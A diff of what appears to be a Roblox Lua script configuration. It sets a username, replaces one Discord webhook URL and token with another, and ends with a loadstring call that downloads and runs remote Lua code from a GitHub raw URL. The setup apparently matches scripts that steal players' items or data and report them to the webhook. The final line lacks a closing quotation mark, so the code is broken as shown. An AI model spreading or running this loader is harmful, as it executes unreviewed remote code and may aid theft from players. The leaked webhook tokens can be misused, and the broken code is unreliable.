@@ -1,4 +1,4 @@
 `_G.Username = "PlaysTheKiki123" --Case Sensitive 
-_G.WebhookUrl = "https://discord.com/api/webhooks/1089189129222373496/SzOZrLol3c49gu3a55mMgdPq3CMuDpV79hrkjjCdPRSRJf0ekZsYtDKJI-p84U44m_Ts"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1092156360839409685/lEHxLcl4BKK3gMc0-AxBBM_MLAygt2KjsNwbx_Hh2rkpXSm21gL3tKVuv-VVrR74uFy8"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua))()`
